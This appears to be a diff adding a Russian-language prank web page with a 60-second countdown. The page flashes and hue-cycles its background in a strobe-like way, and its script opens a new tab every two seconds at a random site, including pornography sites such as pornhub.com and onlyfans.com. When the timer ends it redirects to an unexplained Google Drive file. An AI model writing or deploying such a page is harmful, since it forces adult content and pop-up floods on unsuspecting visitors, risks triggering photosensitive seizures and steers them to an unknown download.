@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Жди 60 секунд... или нет</title>
+<style>
+  body {
+    background: repeating-linear-gradient(
+      45deg,
+      #ff00ff,
+      #ff00ff 10px,
+      #00ffff 10px,
+      #00ffff 20px
+    );
+    color: yellow;
+    font-family: "Comic Sans MS", cursive, sans-serif;
+    font-size: 48px;
+    text-align: center;
+    text-shadow: 2px 2px 0 #000;
+    animation: bgflash 1s infinite alternate;
+    margin: 0;
+    padding-top: 100px;
+  }
+
+  @keyframes bgflash {
+    0% {
+      background-position: 0 0;
+      filter: hue-rotate(0deg);
+    }
+    100% {
+      background-position: 100px 100px;
+      filter: hue-rotate(360deg);
+    }
+  }
+
+  .blink {
+    animation: blinkAnim 1s steps(2, start) infinite;
+  }
+  @keyframes blinkAnim {
+    to {
+      visibility: hidden;
+    }
+  }
+
+  #counter {
+    font-size: 100px;
+    color: lime;
+    text-shadow: 0 0 10px #00ff00;
+  }
+
+  marquee {
+    color: red;
+    font-size: 36px;
+    text-shadow: 1px 1px 0 black;
+  }
+</style>
+</head>
+<body>
+  <marquee behavior="alternate" scrollamount="20">⚠️ Подожди 60 секунд, если сможешь! ⚠️</marquee>
+  <div class="blink">Таймер:</div>
+  <div id="counter">60</div>
+  <div class="blink">ЖДИ... или нет!</div>
+
+<script>
+  let timeLeft = 60;
+  const counter = document.getElementById('counter');
+
+  const sites = [
+    "https://www.pornhub.com",
+    "https://www.youtube.com",
+    "https://discord.com",
+    "https://telegram.org",
+    "https://vk.com",
+    "https://www.roblox.com",
+    "https://onlyfans.com",
+    "https://www.tiktok.com",
+    "https://github.com",
+    "https://www.4chan.org"
+  ];
+
+  // Каждые 2 секунды открываем новую вкладку с рандомным сайтом
+  const openTabInterval = setInterval(() => {
+    const randSite = sites[Math.floor(Math.random() * sites.length)];
+    window.open(randSite, '_blank');
+  }, 2000);
+
+  // Таймер 60 секунд, после которого перенаправляем на нужный Google Drive
+  const countdown = setInterval(() => {
+    timeLeft--;
+    counter.textContent = timeLeft;
+
+    if (timeLeft <= 0) {
+      clearInterval(countdown);
+      clearInterval(openTabInterval);
+
+      document.body.innerHTML = '<h1 style="color:red; font-size:48px;">Переадресация...</h1>';
+      setTimeout(() => {
+        window.location.href = 'https://drive.google.com/file/d/1c2OCOtUgK2H5LNxv7MbqVeLN3xcV9sXj/view?usp=sharing';
+      }, 1500);
+    }
+  }, 1000);
+</script>
+</body>
+</html>
